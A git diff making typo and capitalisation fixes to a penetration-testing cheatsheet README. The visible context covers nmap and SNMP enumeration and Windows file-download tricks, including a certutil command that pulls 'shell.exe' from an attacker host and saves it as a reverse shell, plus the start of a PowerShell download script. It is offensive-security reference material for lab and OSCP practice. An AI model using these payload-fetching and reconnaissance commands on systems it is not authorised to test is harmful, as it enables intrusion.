@@ -1,5 +1,5 @@
 # Hacking-Cheatsheet
-In this repo I collect all commands, links, techniques and tricks i found during my work as pentester, hacker, OSCP student and hack the box fan.
+In this repo I collect all commands, links, techniques and tricks I found during my work as pentester, hacker, OSCP student and hack the box fan.
 
 - [External Enumeration](#external-enumeration)
   - [OSINT](#osint)
@@ -29,7 +29,7 @@ cewl <domain> -m 6 -w words.txt
 ```
 
 ## Port-Scanning
-Scan all ports with Service Detection
+Scan all ports with service detection
 ```bash
 nmap -v -A -p- <Target-IP>
 ```
@@ -68,7 +68,7 @@ examples for community names:
 - public
 
 
-Get list of running programms
+Get list of running programs
 ```bash
 snmpwalk -c public -v1 <Target-IP> 1.3.6.1.2.1.25.4.2.1.2
 ```
@@ -87,7 +87,7 @@ snmpwalk -c public -v1 <Target-IP> 1.3.6.1.2.1.25.6.3.1.2
 # File Transfer and File Downloads
 
 ## Windows
-### Download Files with Certutil
+### Download files with certutil
 ```bash
 certutil.exe -urlcache -f http://<ip>:<port>/<filename> <localfilename>
 ```
@@ -96,7 +96,7 @@ Example:
 certutil.exe -urlcache -f http://10.10.14.37:8080/shell.exe reverse_shell.exe
 ```
 
-### Downlaod Files with Powershell
+### Downlaod files with Powershell
 ```cmd
 echo $storageDir = $pwd > wget.ps1
 echo $webclient = New-Object System.Net.WebClient >>wget.ps1
